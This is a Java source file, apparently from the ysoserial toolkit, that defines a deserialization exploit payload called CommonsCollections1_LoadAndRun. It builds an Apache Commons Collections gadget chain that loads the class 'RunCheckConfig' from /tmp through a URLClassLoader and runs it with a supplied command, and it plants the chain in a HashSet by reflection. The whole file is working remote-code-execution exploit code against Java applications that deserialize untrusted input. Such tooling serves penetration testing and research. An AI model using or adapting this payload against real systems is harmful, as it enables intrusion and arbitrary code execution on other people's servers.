package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.SynchronizedSortedBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.set.SynchronizedSet;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.FROHOFF })
public class CommonsCollections1_LoadAndRun extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		String ClassPath = "file:/tmp/";
		final String cmd = command;

		// real chain for after setup
		final Transformer[] transformers = {
					      new ConstantTransformer(URLClassLoader.class), 
					      
					      new InvokerTransformer("getConstructor", 
					    		  new Class[] {Class[].class}, new Object[] {
					    				  new Class[]{java.net.URL[].class}}), 
					      
					      new InvokerTransformer(
					      "newInstance", 
					      new Class[] {
					    		  Object[].class}, new Object[] { new Object[] { new java.net.URL[] { 
					    
								   new java.net.URL(ClassPath)
					    			
					    		  }}}), 
					      
					      new InvokerTransformer("loadClass", 
					      new Class[] { String.class }, new Object[] { "RunCheckConfig" }), 
					      
					      new InvokerTransformer("getConstructor", 
					      new Class[] { Class[].class }, 
					      new Object[] { new Class[]{ String.class } }), 
					      
					      new InvokerTransformer("newInstance", 
					      new Class[] { Object[].class }, 
					      new Object[] { new String[]{ cmd } }) };
	        Transformer transformerChain = new ChainedTransformer(transformers);

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		// ----------
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
		
        HashMap innimpl = (HashMap) f.get(map);
		
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);
		// ---------- trial

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1_LoadAndRun.class, args);
	}

	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
